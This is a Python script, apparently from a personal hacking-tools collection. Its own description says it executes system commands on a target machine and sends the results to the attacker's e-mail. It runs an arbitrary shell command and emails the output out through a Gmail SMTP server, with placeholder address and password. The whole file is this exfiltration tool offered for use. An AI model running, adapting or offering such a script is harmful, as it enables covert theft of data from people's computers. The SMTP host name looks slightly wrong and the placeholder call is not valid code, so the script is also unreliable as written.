#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 27-06-2020
# Last Updated: 27-06-2020
# Operating System: Linux, Mac, and Windows
# Description: Executes system commands on the target and sends information to the hacker's e-mail.

# Import necessary packages
import subprocess, smtplib, optparse


# Define a function to get user arguements
def get_arguements():
    # Creating an object of the class
    parser = optparse.OptionParser()
    # Expected arguement
    parser.add_option("-c", "--command", dest="command", help="Pass the system command")
    # Returning the value and the arguements passed by the user to variables
    values = parser.parse_args()[0]
    # Checking to see user entered values for both interface and the mac
    if not values.command:
        # Error Handling
        parser.error("[-] Please specify the system command, use --help for more info")
    return values


# Define a function that sends an email
def send_mail(email_id, passwd, msg):
    # Create an instance of the SMTP server (here, a gmail SMTP server is created)
    server = smtplib.SMTP("smtp-mail.gmail.com", 587)
    # Initiate a TLS connection using the created server
    server.starttls()
    # Login to your gmail address
    server.login(email_id, passwd)
    # Send the mail (sender_id, receiver_id, message)
    server.sendmail(email_id, email_id, msg)
    # Quit the server
    server.quit()


# Insert the commands
values = get_arguements()
result =  subprocess.check_output(values.command, shell=True)
send_mail(<YOUR_EMAIL_ADDRESS>, <PASSWORD>, result)